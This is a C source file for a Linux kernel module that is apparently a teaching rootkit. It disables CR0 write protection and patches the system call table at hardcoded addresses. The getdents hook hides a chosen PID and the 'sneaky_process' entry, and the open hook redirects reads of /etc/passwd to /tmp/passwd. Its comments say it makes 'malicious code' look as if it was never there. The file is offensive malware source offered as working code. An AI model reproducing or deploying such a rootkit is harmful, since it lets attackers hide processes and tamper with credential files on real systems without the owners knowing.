#include <linux/module.h> // for all modules
#include <linux/init.h>   // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>    // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/string.h>

struct linux_dirent
{
  long d_ino;
  off_t d_off;
  unsigned short d_reclen;
  char d_name[];
};
static char *processname = "sneaky_process";
static char proc_dir[50] = "/proc/";
static char *etc_passwd = "/etc/passwd";
static char *tmp_passwd = "/tmp/passwd";

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//
static char *mypid;
module_param(mypid, charp, 0000);

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*original_open)(const char *filename, int flags, int mode);
//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

//Define our new sneaky version of the 'getdents' syscall
asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
  //printk(KERN_INFO "pid = %d\n", mypid);
  long value;
  unsigned short len = 0;
  unsigned short tlen = 0;
  value = (*original_getdents)(fd, dirp, count);
  tlen = value;
  while (tlen > 0)
  {
    len = dirp->d_reclen;
    tlen -= len;
    //printk("%s\n", dirp->d_name);
    if (strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0)
    {
      printk("%s\n", dirp->d_name);
      memmove(dirp, (char *)dirp + dirp->d_reclen, tlen);
      value -= len;
      printk(KERN_INFO "hide successful\n");
      continue;
    }
    if (tlen)
    {
      dirp = (struct linux_dirent *)((char *)dirp + dirp->d_reclen);
    }
  }
  //printk(KERN_INFO "finished hacked_getdents.\n");
  return value;
}

asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
  
  if (strcmp(filename, etc_passwd) == 0 )
  {
    //char __user* to = "/tmp/passwd"; 
    copy_to_user(filename, tmp_passwd , (unsigned)strlen(tmp_passwd) + 1 );
    //printk("to = %s, tmp_passwd = %s\n", to, tmp_passwd);
    return (*original_open)( filename, flags, mode);
    
  } else {
    return (*original_open)(filename, flags, mode);
  }
}
/*
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  ssize_t value = (*original_read)(fd, buf, count);
  return value;
  
}*/

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Th  en overwrite its address in the system call
  //table with the function address of our new code.
  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  original_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  //original_read = (void*)*(sys_call_table + __NR_read);
  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  //strcat(proc_dir, mypid);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  //*(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
